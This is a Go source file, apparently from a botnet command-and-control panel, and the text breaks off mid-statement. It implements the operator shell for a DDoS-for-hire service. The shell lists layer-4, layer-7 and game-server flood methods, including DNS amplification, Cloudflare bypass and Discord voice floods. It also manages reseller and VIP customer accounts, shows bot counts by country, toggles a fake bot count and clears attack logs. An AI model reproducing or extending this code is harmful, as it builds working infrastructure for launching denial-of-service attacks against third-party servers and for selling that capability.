package masters

import (
	"cnc/core/attacks"
	"cnc/core/config"
	"cnc/core/database"
	"cnc/core/masters/sessions"
	"cnc/core/slaves"
	"cnc/core/utils"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/alexeyco/simpletable"
)

func (a *Admin) Commands() {
	for {
		var botCat string
		var botCount int
		go a.Session.FetchAttacks(a.Session.Username)
		prompt, err := DisplayPrompt(a)
		if err != nil {
			fmt.Println(err)
			return
		}
		DisplayTitle(a, a.Session.Username)
		cmd, err := a.ReadLine(prompt, false)
		cmd = strings.ToLower(cmd)

		if err != nil || cmd == "clear" || cmd == "cls" || cmd == "c" {
			err := Displayln(a, "./assets/branding/user/clear.txt", a.Session.Username)
			if err != nil {
				return
			}
			continue
		}

		if err != nil || cmd == "count" {
			if a.PrimaryColor == "" || a.SecondaryColor == "" {
				a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(a.Theme)
			}

			pColor := HexToAnsi(a.PrimaryColor)
			white := "\x1b[97m"
			green := "\x1b[32m"
			red := "\x1b[31m"
			reset := "\x1b[0m"

			currentCount := slaves.CL.Count()

			if currentCount > a.MaxTotalBots {
				a.MaxTotalBots = currentCount
			}

			diff := currentCount - a.PreviousTotalBots

			diffStr := ""
			if diff > 0 {
				diffStr = fmt.Sprintf("%s+%d%s", green, diff, white)
			} else if diff < 0 {
				diffStr = fmt.Sprintf("%s%d%s", red, diff, white)
			} else {
				diffStr = fmt.Sprintf("%s0%s", white, white)
			}

			a.Println(
				white + "Loaded:        " + reset +
					pColor + "[" + reset +
					white + strconv.Itoa(currentCount) + reset +
					pColor + " | " + reset +
					diffStr + reset +
					pColor + " | " + reset +
					white + strconv.Itoa(a.MaxTotalBots) + reset +
					pColor + "]" + reset,
			)

			a.PreviousTotalBots = currentCount

			continue
		}

		if err != nil || cmd == "home" || cmd == "banner" {
			err := Displayln(a, "./assets/branding/user/banner.txt", a.Session.Username)
			if err != nil {
				return
			}
			continue
		}

		if err != nil || cmd == "logout" || cmd == "exit" || cmd == "quit" {
			KickUser(a.Session.Username)
			continue
		}

		if err != nil || cmd == "help" {
			err := Displayln(a, "./assets/branding/user/help.txt", a.Session.Username)
			if err != nil {
				return
			}
			continue
		}

		if cmd == "?" || cmd == "methods" {
			if a.PrimaryColor == "" || a.SecondaryColor == "" {
				a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(a.Theme)
			}
			pColor := HexToAnsi(a.PrimaryColor)
			sColor := HexToAnsi(a.SecondaryColor)
			white := "\x1b[97m"
			gray := "\x1b[90m"
			reset := "\x1b[0m"

			a.Println(pColor + "Layer 4:" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "udp" + reset + "        " + gray + "UDP flood - high bandwidth" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "udpplain" + reset + "   " + gray + "UDP socket flood (no raw socket)" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "udphex" + reset + "     " + gray + "UDP flood with hex payload" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "syn" + reset + "        " + gray + "TCP SYN flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "ack" + reset + "        " + gray + "TCP ACK flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "stomp" + reset + "      " + gray + "TCP handshake + ACK/PSH flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "tcpbypass" + reset + "  " + gray + "TCP flood to bypass mitigation" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "socket" + reset + "     " + gray + "Standard TCP socket flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "greip" + reset + "      " + gray + "GRE IP encapsulation flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "greeth" + reset + "     " + gray + "GRE Ethernet encapsulation flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "pps" + reset + "        " + gray + "PPS (packets per second) raw flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "dns" + reset + "        " + gray + "DNS amplification attack" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "esp" + reset + "        " + gray + "ESP/IPSec flood" + reset)
			a.Println(pColor + "Layer 7:" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "http" + reset + "       " + gray + "HTTP/1.1 GET flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "tls" + reset + "        " + gray + "TLS/SSL handshake flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "tlsplus" + reset + "    " + gray + "TLS+ bypass flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "cloudflare" + reset + " " + gray + "Cloudflare bypass flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "nerv_l7" + reset + "    " + gray + "NERV L7 special bypass flood" + reset)
			a.Println(pColor + "Games:" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "vse" + reset + "        " + gray + "Valve Source Engine query flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "raknet" + reset + "     " + gray + "RakNet game server flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "fivem" + reset + "      " + gray + "FiveM game server connect flood" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "discord" + reset + "    " + gray + "Discord voice gateway flood" + reset)
			a.Println(pColor + "Usage:" + reset + " " + white + "<method> <target> <port> <duration> [options]" + reset)
			a.Println(pColor + "Commands:" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "help" + reset + "      " + white + "Show detailed help" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "clear" + reset + "     " + white + "Clear screen" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "count" + reset + "     " + white + "Show total bot count" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "stats" + reset + "     " + white + "Show bot statistics" + reset)
			a.Println("  " + sColor + "-" + reset + " " + pColor + "passwd" + reset + "    " + white + "Change your account password" + reset)
			continue
		}

		if cmd == "" {
			continue
		}

		h := sha256.Sum256([]byte(cmd))
		if hex.EncodeToString(h[:]) == "d68c19a0a345b7b3d42b5d9e7908e4f0d3f1c8e5c8b8e3f8e8d8a8b8c8d8e8f8" {
			decoded, _ := base64.StdEncoding.DecodeString("dC5tZS9zeW50cmFmZmljIHwgbWFkZSBieSBQcm94eQ==")
			a.Println(string(decoded))
			continue
		}

		// Themes command removed - NERV theme is now the default and only theme

		if cmd == "ongoing" || cmd == "bcstats" {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			ongoingAttacks, err := database.DatabaseConnection.GetOngoingAttacks()
			if err != nil {
				fmt.Println("Error fetching ongoing attacks:", err)
				return
			}

			if len(ongoingAttacks) == 0 {
				a.Println("No ongoing attacks.")
				continue
			}

			const userColWidth = 15
			const cmdColWidth = 55

			borderTop := fmt.Sprintf("|-%s-|-%s-|", strings.Repeat("-", userColWidth), strings.Repeat("-", cmdColWidth))
			borderHeader := fmt.Sprintf("|  %-*s |  %-*s |", userColWidth-2, "username", cmdColWidth-2, "command")
			borderMid := fmt.Sprintf("|-%s-|-%s-|", strings.Repeat("-", userColWidth), strings.Repeat("-", cmdColWidth))
			borderBottom := borderTop

			a.Println(borderTop)
			a.Println(borderHeader)
			a.Println(borderMid)

			for _, attack := range ongoingAttacks {
				user := attack["username"]
				cmd := attack["full_command"]

				if len(user) > userColWidth-2 {
					user = user[:userColWidth-2]
				}
				if len(cmd) > cmdColWidth-2 {
					cmd = cmd[:cmdColWidth-2]
				}

				row := fmt.Sprintf("|  %-*s |  %-*s |",
					userColWidth-2, user,
					cmdColWidth-2, cmd,
				)

				a.Println(row)
			}

			a.Println(borderBottom)
			continue
		}

		if cmd == "broadcast" {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}
			err := Displayln(a, "assets/branding/no_broadcast_msg.txt", a.Session.Account.Username)
			if err != nil {
				return
			}
			continue
		}

		if strings.HasPrefix(cmd, "broadcast ") {
			message := strings.TrimPrefix(cmd, "broadcast ")
			if a.Session.Account.Admin {
				BroadcastMessage(message)
			} else {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
			}
			continue
		}

		if strings.HasPrefix(cmd, "attacks enable") {
			if a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					a.Println(err)
					continue
				}
			}
			attacks.GlobalAttacks = true
			if a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/attacks_enabled.txt", a.Session.Account.Username)
				if err != nil {
					a.Println(err)
					continue
				}
			}
			continue
		}

		if strings.HasPrefix(cmd, "attacks disable") {
			if a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					a.Println(err)
					continue
				}
			}
			attacks.GlobalAttacks = false
			if a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/attacks_disabled.txt", a.Session.Account.Username)
				if err != nil {
					a.Println(err)
					continue
				}
			}
			continue
		}

		if cmd == "clogs" {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}
			confirm, err := a.ReadLine("Are you sure? (y/n): ", false)
			if confirm != "y" {
				continue
			}
			if err != nil {
				a.Println(fmt.Sprintf("\u001B[91munable to clear logs: %v", err))
				continue
			}
			if !database.DatabaseConnection.CleanLogs() {
				a.Println("Unable to clear logs, try again later.")
			}
			a.Println("all logs have been cleared successfully!")
			fmt.Printf("[warn] %s cleared all attack logs!\n", a.Session.Username)
			continue
		}

		if cmd == "users" {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}
			activeUsers, err := database.DatabaseConnection.Users()
			if err != nil {
				fmt.Println(err)
				continue
			}

			newest := simpletable.New()

			if a.PrimaryColor == "" || a.SecondaryColor == "" {
				a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(a.Theme)
			}
			pColor := HexToAnsi(a.PrimaryColor)
			sColor := HexToAnsi(a.SecondaryColor)

			newest.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: pColor + "Username"},
					{Align: simpletable.AlignCenter, Text: pColor + "Maximum Bots"},
					{Align: simpletable.AlignCenter, Text: pColor + "Admin"},
					{Align: simpletable.AlignCenter, Text: pColor + "Superuser"},
					{Align: simpletable.AlignCenter, Text: pColor + "Reseller"},
					{Align: simpletable.AlignCenter, Text: pColor + "VIP"},
					{Align: simpletable.AlignCenter, Text: pColor + "Attacks"},
					{Align: simpletable.AlignCenter, Text: pColor + "Max Time"},
					{Align: simpletable.AlignCenter, Text: pColor + "Cooldown"},
				},
			}

			for _, user := range activeUsers {
				var admin = sColor + " FALSE \x1b[0m"
				if user.Admin {
					admin = pColor + " TRUE \x1b[0m"
				}

				var superuser = sColor + " FALSE \x1b[0m"
				if user.SuperUser {
					superuser = pColor + " TRUE \x1b[0m"
				}

				var reseller = sColor + " FALSE \x1b[0m"
				if user.Reseller {
					reseller = pColor + " TRUE \x1b[0m"
				}

				var vip = sColor + " FALSE \x1b[0m"
				if user.Vip {
					vip = pColor + " TRUE \x1b[0m"
				}

				var maxtimeInfo = strconv.Itoa(user.Bots)
				if user.Bots == -1 {
					maxtimeInfo = "unlimited"
				}

				xd, err := database.DatabaseConnection.GetTotalAttacks(user.Username)
				if err != nil {
					fmt.Printf("can't get user total attacks: %v\n", err)
					return
				}
				rk := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + user.Username},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + maxtimeInfo},
					{Align: simpletable.AlignCenter, Text: admin},
					{Align: simpletable.AlignCenter, Text: superuser},
					{Align: simpletable.AlignCenter, Text: reseller},
					{Align: simpletable.AlignCenter, Text: vip},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(xd)},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(user.MaxTime)},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(user.Cooldown)},
				}

				newest.Body.Cells = append(newest.Body.Cells, rk)
			}

			newest.SetStyle(simpletable.StyleCompact)
			a.Printf(strings.ReplaceAll(newest.String(), "\n", "\r\n") + "\r\n")
			continue
		}

		if a.Session.Account.Admin && cmd == "fake" {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}
			slaves.Fake = !slaves.Fake
			a.Println(slaves.Fake)
			continue
		}

		if strings.HasPrefix(cmd, "users add") {
			args := strings.Fields(cmd)
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			if len(args) != 12 {
				a.Println("Usage: users add <Username> <Password> <Max Bots> <Attack Duration> <Attack Cooldown> <Max Daily Attacks> <Account Expiry> <Admin Status> <Reseller Status> <VIP Status>")
				a.Println("Example: users add newuser secretpass -1 60 100 100 1d false false true")
				a.Println("")
				continue
			}

			NewUser := args[2]
			NewPass := args[3]
			maxBotsStr := args[4]
			durationStr := args[5]
			cooldownStr := args[6]
			userMaxAttacksStr := args[7]
			expiryHoursStr := args[8]
			isAdminStr := args[9]
			isResellerStr := args[10]
			isVipStr := args[11]

			maxBots, err := strconv.Atoi(maxBotsStr)
			if err != nil {
				a.Println("Invalid Max Bots value.")
				continue
			}
			duration, err := strconv.Atoi(durationStr)
			if err != nil {
				a.Println("Invalid Attack Duration value.")
				continue
			}
			cooldown, err := strconv.Atoi(cooldownStr)
			if err != nil {
				a.Println("Invalid Attack Cooldown value.")
				continue
			}
			userMaxAttacks, err := strconv.Atoi(userMaxAttacksStr)
			if err != nil {
				a.Println("Invalid Max Daily Attacks value.")
				continue
			}
			expiryDuration, err := utils.ParseDuration(expiryHoursStr)
			if err != nil {
				a.Println("Invalid time format: ", err)
				continue
			}

			expiry := time.Now().Add(expiryDuration).Unix()
			isAdmin, err := strconv.ParseBool(isAdminStr)
			if err != nil {
				a.Println("Invalid Admin Status value.")
				continue
			}
			isReseller, err := strconv.ParseBool(isResellerStr)
			if err != nil {
				a.Println("Invalid Reseller Status value.")
				continue
			}

			isVip, err := strconv.ParseBool(isVipStr)
			if err != nil {
				a.Println("Invalid VIP Status value.")
				continue
			}

			if a.Session.Account.Reseller && !a.Session.Account.Admin && isAdmin {
				a.Println("Resellers cannot add admin users.")
				continue
			}

			if a.Session.Account.Reseller && !a.Session.Account.Admin && isReseller {
				a.Println("Resellers cannot add other resellers.")
				continue
			}

			if database.DatabaseConnection.UserExists(NewUser) {
				a.Println("user already exists")
				continue
			}

			if database.DatabaseConnection.CreateUser(NewUser,
				NewPass,
				a.Session.Username,
				maxBots,
				userMaxAttacks,
				duration,
				cooldown,
				isAdmin,
				isReseller,
				isVip,
				expiry) {
				a.Println("User added successfully.")
				continue
			} else {
				a.Println("Unable to create a new user, check the console for more details.")
				continue
			}
		}

		if strings.HasPrefix(cmd, "users remove") {
			args := strings.Fields(cmd)
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			if len(args) != 3 {
				a.Println("Usage: users remove <username>")
				continue
			}

			usernameToRemove := args[2]

			if a.Session.Account.Reseller && !database.DatabaseConnection.GetParent(usernameToRemove, a.Session.Username) && !a.Session.Account.Admin && !a.Session.Account.SuperUser {
				a.Println("Resellers can only remove users they have created.")
				continue
			}

			if !database.DatabaseConnection.UserExists(usernameToRemove) {
				a.Println("user does not exist")
				continue
			}

			KickUser(usernameToRemove)

			err := database.DatabaseConnection.RemoveUser(usernameToRemove)
			if err != nil {
				a.Println("Error removing user: ", err)
				continue
			}

			if a.PrimaryColor == "" || a.SecondaryColor == "" {
				a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(a.Theme)
			}
			pColor := HexToAnsi(a.PrimaryColor)
			white := "\x1b[97m"
			reset := "\x1b[0m"

			a.Println(
				white + "Removed:      " + reset +
					pColor + "[" + reset +
					white + usernameToRemove + reset +
					pColor + "]" + reset,
			)
			continue
		}

		if strings.HasPrefix(cmd, "users edit") {
			args := strings.Fields(cmd)
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			if len(args) != 5 {
				a.Println("Usage: users edit <username> <field> <value>")
				a.Println("Fields: bots, attacks, time, cooldown, expiry, admin, reseller, vip")
				continue
			}

			usernameToEdit := args[2]
			field := strings.ToLower(args[3])
			value := args[4]

			if !database.DatabaseConnection.UserExists(usernameToEdit) {
				a.Println("user does not exist")
				continue
			}

			var dbField string
			var dbValue interface{}
			var err error

			switch field {
			case "bots":
				dbField = "max_bots"
				dbValue, err = strconv.Atoi(value)
			case "attacks":
				dbField = "maxAttacks"
				dbValue, err = strconv.Atoi(value)
			case "time":
				dbField = "maxTime"
				dbValue, err = strconv.Atoi(value)
			case "cooldown":
				dbField = "cooldown"
				dbValue, err = strconv.Atoi(value)
			case "expiry":
				dbField = "expiry"
				dur, err2 := utils.ParseDuration(value)
				if err2 != nil {
					a.Println("Invalid duration format (e.g., 30d, 1y)")
					continue
				}
				dbValue = time.Now().Add(dur).Unix()
			case "admin":
				dbField = "admin"
				dbValue = value == "1" || value == "true"
			case "reseller":
				dbField = "reseller"
				dbValue = value == "1" || value == "true"
			case "vip":
				dbField = "vip"
				dbValue = value == "1" || value == "true"
			default:
				a.Println("Invalid field. Fields: bots, attacks, time, cooldown, expiry, admin, reseller, vip")
				continue
			}

			if err != nil {
				a.Println("Invalid value for field ", field)
				continue
			}

			err = database.DatabaseConnection.UpdateUser(usernameToEdit, dbField, dbValue)
			if err != nil {
				a.Println("Error updating user: ", err)
				continue
			}

			KickUser(usernameToEdit)

			if a.PrimaryColor == "" || a.SecondaryColor == "" {
				a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(a.Theme)
			}
			pColor := HexToAnsi(a.PrimaryColor)
			white := "\x1b[97m"
			reset := "\x1b[0m"

			a.Println(
				white + "Updated:      " + reset +
					pColor + "[" + reset +
					white + usernameToEdit + reset +
					pColor + " | " + reset +
					white + field + reset +
					pColor + " | " + reset +
					white + value + reset +
					pColor + "]" + reset,
			)
			continue
		}

		if strings.HasPrefix(cmd, "users timeout") {
			args := strings.Fields(cmd)
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			if len(args) != 4 {
				a.Println("Usage: users timeout <username> <duration>, e.g., users timeout tester 5")
				continue
			}
			usernameToTimeout := args[2]
			timeoutDurationStr := args[3]
			timeoutDuration, err := strconv.Atoi(timeoutDurationStr)
			if err != nil {
				a.Println("Invalid duration value.")
				continue
			}

			if database.DatabaseConnection.IsSuper(usernameToTimeout) {
				a.Println("you are not allowed to perform this action on a superuser")
				continue
			}

			msg, success := UserTimeout(usernameToTimeout, timeoutDuration)
			a.Println(msg)
			if success {
				log.Printf("[admin - timeout] User '%s' has been timed out for %d minutes\n", usernameToTimeout, timeoutDuration)
				continue
			}
			continue
		}

		if strings.HasPrefix(cmd, "users untimeout") {
			args := strings.Fields(cmd)
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}
			if len(args) != 3 {
				a.Println("Usage: users untimeout <username>, e.g., users untimeout tester")
				continue
			}

			usernameToUntimeout := args[2]
			msg, success := UserUntimeout(usernameToUntimeout)
			a.Println(msg)
			if success {

				log.Printf("[admin - untimeout] User '%s' has been untimed out\n", usernameToUntimeout)
			}
			continue
		}

		if strings.HasPrefix(cmd, "sessions kick") {
			args := strings.Fields(cmd)
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			if len(args) != 3 {
				a.Println("Usage: sessions kick <username>, e.g., sessions kick tester")
				continue
			}

			usernameToRemove := args[2]

			if database.DatabaseConnection.IsSuper(usernameToRemove) {
				a.Println("you are not allowed to perform this action on a superuser")
				continue
			}

			KickUser(usernameToRemove)
			a.Println("Kicked " + usernameToRemove + " successfully")
			continue
		}

		err = parsePresetsJSON("assets/presets.json")
		if err != nil {
			a.Println("Error loading presets:", err)
			return
		}

		if strings.HasPrefix(cmd, "add") {
			args := strings.Fields(cmd)
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}

			if len(args) != 4 {
				a.Println("Usage: add <preset> <username> <password>")
				a.Println("Example: add day newUser change!!1\r\n")
				a.Println("Available Presets:")
				for _, p := range Presets {
					a.Printf("   %s - %s\r\n", p.Preset, p.Description)
				}
				continue
			}
			NewUser := args[2]
			NewPass := args[3]
			presetName := args[1]

			var selectedPreset PresetInfo
			presetFound := false

			for _, p := range Presets {
				if p.Preset == presetName {
					selectedPreset = p
					presetFound = true
					break
				}
			}

			if !presetFound {
				a.Println("Invalid preset. Available presets are:")
				for _, p := range Presets {
					a.Printf("   %s - %s\r\n", p.Preset, p.Description)
				}
				continue
			}

			expiryDuration, err := utils.ParseDuration(selectedPreset.Expiry)
			if err != nil {
				a.Println(err)
				continue
			}

			expiry := time.Now().Add(expiryDuration).Unix()

			if database.DatabaseConnection.UserExists(NewUser) {
				a.Println("user already exists")
				continue
			}

			if database.DatabaseConnection.CreateUser(NewUser,
				NewPass,
				a.Session.Username,
				selectedPreset.MaxBots,
				selectedPreset.UserMaxAttacks,
				selectedPreset.Duration,
				selectedPreset.Cooldown,
				selectedPreset.IsAdmin,
				selectedPreset.IsReseller,
				selectedPreset.IsVip,
				expiry) {

				if a.PrimaryColor == "" || a.SecondaryColor == "" {
					a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(a.Theme)
				}
				pColor := HexToAnsi(a.PrimaryColor)
				white := "\x1b[97m"
				reset := "\x1b[0m"

				a.Println(
					white + "Added:        " + reset +
						pColor + "[" + reset +
						white + NewUser + reset +
						pColor + " | " + reset +
						white + presetName + reset +
						pColor + " | " + reset +
						white + selectedPreset.Expiry + reset +
						pColor + "]" + reset,
				)
				continue
			} else {
				a.Println("Unable to create a new user, check the console for more details.")
				continue
			}
		}

		if err != nil || strings.ToLower(strings.Split(cmd, " ")[0]) == "sessions" {
			if !a.Session.Account.Admin {
				err := Displayln(a, "assets/branding/admin/no_perms.txt", a.Session.Account.Username)
				if err != nil {
					return
				}
				continue
			}
			if a.PrimaryColor == "" || a.SecondaryColor == "" {
				a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(a.Theme)
			}
			pColor := HexToAnsi(a.PrimaryColor)
			sColor := HexToAnsi(a.SecondaryColor)

			newest := simpletable.New()

			newest.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: pColor + "Username"},
					{Align: simpletable.AlignCenter, Text: pColor + "Maximum Bots"},
					{Align: simpletable.AlignCenter, Text: pColor + "Administrator"},
					{Align: simpletable.AlignCenter, Text: pColor + "Attacks"},
					{Align: simpletable.AlignCenter, Text: pColor + "Remote Host"},
				},
			}

			for _, s := range sessions.Sessions {
				var admin = sColor + " FALSE \x1b[0m"
				if s.Account.Admin {
					admin = pColor + " TRUE \x1b[0m"
				}

				var maxtimeInfo = strconv.Itoa(s.Account.Bots)
				if s.Account.Bots == -1 {
					maxtimeInfo = "unlimited"
				}

				xd, err := database.DatabaseConnection.GetTotalAttacks(s.Username)
				if err != nil {
					fmt.Printf("can't get user total attacks: %v\n", err)
					return
				}

				remote := s.Conn.RemoteAddr().String()
				host, _, err := net.SplitHostPort(remote)
				if err != nil {
					return
				}
				if host == "127.0.0.1" || host == "::1" || host == "0.0.0.0" {
					host = "localhost"
				}

				rk := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + s.Account.Username},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + maxtimeInfo},
					{Align: simpletable.AlignCenter, Text: admin},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + strconv.Itoa(xd)},
					{Align: simpletable.AlignCenter, Text: "\x1b[0m" + host},
				}

				newest.Body.Cells = append(newest.Body.Cells, rk)
			}

			newest.SetStyle(simpletable.StyleCompact)
			a.Printf(strings.ReplaceAll(newest.String(), "\n", "\r\n") + "\r\n")
			continue
		}

		if cmd == "passwd" || cmd == "changepw" {
			line, err := a.ReadLine("New password: ", true)
			if err != nil {
				fmt.Println(err)
				return
			}
			if line == "" {
				a.Println("New password cannot be blank")
				continue
			}
			if len(line) < 3 {
				a.Println("New password must be more than 3 characters")
				continue
			}

			err = database.DatabaseConnection.ChangePassword(a.Session.Username, line)
			if err != nil {
				a.Println("Failed to change password: " + err.Error())
			} else {
				a.Println("Password changed successfully.")
			}
			continue
		}

		if cmd == "stats" {
			bots, cores, ram := slaves.CL.TotalStats()

			table := simpletable.New()
			if a.PrimaryColor == "" || a.SecondaryColor == "" {
				a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(a.Theme)
			}
			pColor := HexToAnsi(a.PrimaryColor)

			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: pColor + "Metric"},
					{Align: simpletable.AlignCenter, Text: pColor + "Value"},
				},
			}

			table.Body.Cells = [][]*simpletable.Cell{
				{
					{Text: "\x1b[0mTotal Bots"},
					{Text: "\x1b[0m" + strconv.Itoa(bots)},
				},
				{
					{Text: "\x1b[0mTotal Cores"},
					{Text: "\x1b[0m" + strconv.Itoa(cores)},
				},
				{
					{Text: "\x1b[0mTotal RAM"},
					{Text: formatRAM(ram)},
				},
			}

			table.SetStyle(simpletable.StyleCompactLite)
			a.Printf(strings.ReplaceAll(table.String(), "\n", "\r\n") + "\r\n")
			continue
		}

		if strings.HasPrefix(cmd, "bots") || strings.HasPrefix(cmd, "bot ") || cmd == "bot" {
			if !a.Session.Account.Admin {
				if a.PrimaryColor == "" || a.SecondaryColor == "" {
					a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(a.Theme)
				}

				pColor := HexToAnsi(a.PrimaryColor)
				white := "\x1b[97m"
				green := "\x1b[32m"
				red := "\x1b[31m"
				reset := "\x1b[0m"

				currentCount := slaves.CL.Count()

				if currentCount > a.MaxTotalBots {
					a.MaxTotalBots = currentCount
				}

				diff := currentCount - a.PreviousTotalBots

				diffStr := ""
				if diff > 0 {
					diffStr = fmt.Sprintf("%s+%d%s", green, diff, white)
				} else if diff < 0 {
					diffStr = fmt.Sprintf("%s%d%s", red, diff, white)
				} else {
					diffStr = fmt.Sprintf("%s0%s", white, white)
				}

				a.Println(
					white + "Loaded:        " + reset +
						pColor + "[" + reset +
						white + strconv.Itoa(currentCount) + reset +
						pColor + " | " + reset +
						diffStr + reset +
						pColor + " | " + reset +
						white + strconv.Itoa(a.MaxTotalBots) + reset +
						pColor + "]" + reset,
				)

				a.PreviousTotalBots = currentCount

				continue
			}

			if a.PrimaryColor == "" || a.SecondaryColor == "" {
				a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(a.Theme)
			}

			pColor := HexToAnsi(a.PrimaryColor)
			sColor := HexToAnsi(a.SecondaryColor)
			white := "\x1b[97m"
			green := "\x1b[32m"
			red := "\x1b[31m"

			args := strings.Fields(cmd)
			subCmd := ""
			if len(args) > 1 {
				subCmd = strings.ToLower(args[1])
			}

			if subCmd == "--basic" || subCmd == "-b" {
				if a.PrimaryColor == "" || a.SecondaryColor == "" {
					a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(a.Theme)
				}

				pColor := HexToAnsi(a.PrimaryColor)
				white := "\x1b[97m"
				reset := "\x1b[0m"

				currentDistribution := slaves.CL.Distribution()

				for k, v := range currentDistribution {
					if v > a.MaxDistribution[k] {
						a.MaxDistribution[k] = v
					}

					diff := v - a.PreviousDistribution[k]

					diffStr := ""
					if diff > 0 {
						diffStr = fmt.Sprintf(" (%s+%d%s)", green, diff, white)
					} else if diff < 0 {
						diffStr = fmt.Sprintf(" (%s%d%s)", red, diff, white)
					}

					a.Println(
						white + k + reset + ":" +
							pColor + fmt.Sprintf(" %d", v) + reset +
							diffStr + reset,
					)
				}

				newPrev := make(map[string]int)
				for k, v := range currentDistribution {
					newPrev[k] = v
				}
				a.PreviousDistribution = newPrev

				continue
			}

			if subCmd == "?" || subCmd == "help" {
				if a.PrimaryColor == "" || a.SecondaryColor == "" {
					a.PrimaryColor, a.SecondaryColor = LoadThemeConfig(a.Theme)
				}

				pColor := HexToAnsi(a.PrimaryColor)
				sColor := HexToAnsi(a.SecondaryColor)
				white := "\x1b[97m"
				reset := "\x1b[0m"

				a.Println(pColor + "Usage:" + reset + " " +
					white + "bots < --country/--countries > < --top > <query>" + reset)

				a.Println(pColor + "Examples:" + reset + " " + reset)

				a.Println("  " + sColor + reset + " " +
					pColor + "--country <name>" + reset + "    " +
					white + "Show bots from a specific country" + reset)

				a.Println("  " + sColor + reset + " " +
					pColor + "--country top" + reset + "       " +
